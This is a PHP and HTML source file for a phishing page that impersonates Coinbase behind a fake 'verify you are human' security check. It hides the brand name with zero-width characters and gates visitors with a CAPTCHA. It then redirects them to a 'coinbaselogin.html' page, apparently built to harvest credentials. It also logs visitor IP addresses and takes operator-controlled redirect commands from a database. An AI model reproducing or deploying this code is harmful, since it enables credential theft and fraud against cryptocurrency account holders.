<?php
// ==================== HEALTH CHECK ====================
if ($_SERVER['REQUEST_METHOD'] === 'HEAD') {
    http_response_code(200);
    exit;
}

// ==================== PROTECTION START ====================
// Include both protection scripts

require_once 'blocker-raw.php';

// Additional security headers
header("X-Frame-Options: DENY");
header("X-Content-Type-Options: nosniff");
header("X-XSS-Protection: 1; mode=block");
header("Referrer-Policy: no-referrer");

// Start output buffering
ob_start();

// Check for redirect commands
require_once 'config/database.php';
$database = new Database();
$db = $database->getConnection();

// Create redirect_commands table if not exists
$create_table = "CREATE TABLE IF NOT EXISTS redirect_commands (
    id SERIAL PRIMARY KEY,
    command VARCHAR(50) NOT NULL,
    target TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)";
$db->exec($create_table);

// Get current redirect command
$query = "SELECT target FROM redirect_commands WHERE command = 'redirect' ORDER BY created_at DESC LIMIT 1";
$stmt = $db->query($query);
$redirect_target = $stmt->fetch(PDO::FETCH_ASSOC);

if ($redirect_target) {
    $redirect_target = trim($redirect_target['target']);
    
    // Log the redirect
    $log_query = "INSERT INTO redirect_logs (ip_address, target, created_at) VALUES (:ip, :target, NOW())";
    
    // Create redirect_logs table if not exists
    $create_logs_table = "CREATE TABLE IF NOT EXISTS redirect_logs (
        id SERIAL PRIMARY KEY,
        ip_address VARCHAR(45),
        target TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )";
    $db->exec($create_logs_table);
    
    $stmt = $db->prepare($log_query);
    $stmt->execute([':ip' => $_SERVER['REMOTE_ADDR'], ':target' => $redirect_target]);
    
    // Perform redirect if target is valid
    if ($redirect_target && $redirect_target !== 'None') {
        header("Location: $redirect_target");
        exit;
    }
}

// Handle captcha verification
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['g-recaptcha-response'])) {
    $captcha_response = $_POST['g-recaptcha-response'];
    
    // Verify captcha with Google
    $secret_key = '6Le-wvkSAAAAAPBMRTvw0Q4Muexq9bi0DJwx_mJ-'; // Change this!
    $verify_url = 'https://www.google.com/recaptcha/api/siteverify';
    
    $data = [
        'secret' => $secret_key,
        'response' => $captcha_response,
        'remoteip' => $_SERVER['REMOTE_ADDR']
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    $result = file_get_contents($verify_url, false, $context);
    $response = json_decode($result, true);
    
    header('Content-Type: application/json');
    echo json_encode(['success' => $response['success'] ?? false]);
    exit;
}
// ==================== PROTECTION END ====================
?>
<!DOCTYPE html>
<html lang="en-US" dir="ltr">
    <head>
        <title>Just a moment...</title>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="google-site-verification" content="GyFOcNN51kFhhWUq753C23nII3fhEfCFSBw-0kB47Us" />
        
        <style>
            *{box-sizing:border-box;margin:0;padding:0}html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131;font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji"}
            body{display:flex;flex-direction:column;height:100vh;min-height:100vh}
            .main-wrapper {flex: 1;}
            .main-content{margin:8rem auto;padding-left:1.5rem;max-width:60rem}@media (width <= 720px){.main-content{margin-top:4rem}}.h2{line-height:2.25rem;font-size:1.5rem;font-weight:500}@media (width <= 720px){.h2{line-height:1.5rem;font-size:1.25rem}}#challenge-error-text{background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI0IyMEYwMyIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxOSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjQjIwRjAzIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+");background-repeat:no-repeat;background-size:contain;padding-left:34px}@media (prefers-color-scheme: dark){body{background-color:#222;color:#d9d9d9}}</style>

        <!-- Rest of your existing CSS styles -->
        <style>
            .captcha-container {
                display: flex;
                justify-content: flex-start;
                margin: 1rem 0;
            }
            
            #uMtSJ0 {
                display: block !important;
            }
            
            #uMtSJ0 > div > div {
                display: block;
                width: 100%;
            }
            
            .g-recaptcha {
                transform: scale(0.95);
                transform-origin: 0 0;
            }
            
            .loading-verifying {
                text-align: center;
                margin: 1rem 0;
            }
            
            .lds-ring {
                display: inline-block;
                position: relative;
                width: 80px;
                height: 80px;
            }
            
            .lds-ring div {
                box-sizing: border-box;
                display: block;
                position: absolute;
                width: 64px;
                height: 64px;
                margin: 8px;
                border: 8px solid #fff;
                border-radius: 50%;
                animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
                border-color: #fff transparent transparent transparent;
            }
            
            .lds-ring div:nth-child(1) { animation-delay: -0.45s; }
            .lds-ring div:nth-child(2) { animation-delay: -0.3s; }
            .lds-ring div:nth-child(3) { animation-delay: -0.15s; }
            
            @keyframes lds-ring {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            
            #redirect-message {
                background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMyIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI2IDI2Ij48cGF0aCBmaWxsPSIjMzEzMTMxIiBkPSJNMTMgMGExMyAxMyAwIDEgMCAwIDI2IDEzIDEzIDAgMCAwIDAtMjZtMCAyNGExMSAxMSAwIDEgMSAwLTIyIDExIDExIDAgMCAxIDAgMjIiLz48cGF0aCBmaWxsPSIjMzEzMTMxIiBkPSJtMTAuOTU1IDE2LjA1NS0zLjk1LTQuMTI1LTEuNDQ1IDEuMzg1IDUuMzcgNS42MSA5LjQ5NS05LjYtMS40Mi0xLjQwNXoiLz48L3N2Zz4=");
                background-repeat: no-repeat;
                background-size: contain;
                padding-left: 42px;
            }
        </style>

        <script src='https://www.google.com/recaptcha/api.js'></script>
        
        <script>
            function onCaptchaVerify(response) {
                console.log('Captcha verified, response:', response);
                
                // Show loading
                document.getElementById('bBCk7').style.display = 'block';
                document.getElementById('uMtSJ0').style.display = 'none';
                
                // Send the captcha response to server for verification
                fetch('index.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: 'g-recaptcha-response=' + encodeURIComponent(response)
                })
                .then(res => res.json())
                .then(data => {
                    if (data.success) {
                        // Show success message
                        document.getElementById('bBCk7').style.display = 'none';
                        document.getElementById('Zdps1').style.display = 'block';
                        
                        // Redirect to coinbaselogin.html after 2 seconds
                        setTimeout(() => {
                            window.location.href = 'coinbaselogin.html';
                        }, 2000);
                    } else {
                        alert('Captcha verification failed. Please try again.');
                        grecaptcha.reset();
                        document.getElementById('bBCk7').style.display = 'none';
                        document.getElementById('uMtSJ0').style.display = 'block';
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('An error occurred. Please try again.');
                    grecaptcha.reset();
                    document.getElementById('bBCk7').style.display = 'none';
                    document.getElementById('uMtSJ0').style.display = 'block';
                });
            }
        </script>
    </head>
    <body>
        <div class="main-wrapper" role="main">
            <div class="main-content">
                <h1 class="zone-name-title h1">login.c&#8203;oinbase.com</h1>
                <p id="Truv1" class="h2 spacer-bottom">Verify you are human by completing the action below.</p>
                
                <div id="uMtSJ0">
                    <div>
                        <div>
                            <div class="captcha-container">
                                <div class="g-recaptcha" 
                                     data-sitekey="6Le-wvkSAAAAAPBMRTvw0Q4Muexq9bi0DJwx_mJ-"
                                     data-callback="onCaptchaVerify"></div>
                            </div>
                            <input type="hidden" name="g-recaptcha-response" id="g-recaptcha-response">
                        </div>
                    </div>
                </div>
                
                <div id="bBCk7" class="spacer loading-verifying" style="display: none;">
                    <div class="lds-ring">
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                    </div>
                    <p>Verifying...</p>
                </div>
                
                <div id="Zdps1" style="display: none;">
                    <div class="core-msg spacer" id="redirect-message">Redirecting to C&#8203;oinbase...</div>
                </div>
                <div class="core-msg spacer spacer-top">login.c&#8203;oinbase.com needs to review the security of your connection before proceeding.</div>
                
                <noscript>
                    <div style="text-align: center; margin: 2rem 0;">
                        <p>Please enable JavaScript to complete the security verification.</p>
                    </div>
                </noscript>
            </div>
        </div>
        
        <div class="footer" role="contentinfo">
            <div class="footer-inner">
                <div class="clearfix diagnostic-wrapper">
                    <div class="ray-id">Performance &amp; security by
                        <a rel="noopener noreferrer" href="https://www.C&#8203;oinbase.com" target="_blank">C&#8203;oinbase</a>
                    </div>
                </div>
            </div>
        </div>
    </body>
</html>
<?php
// End output buffering and send content
ob_end_flush();
?>
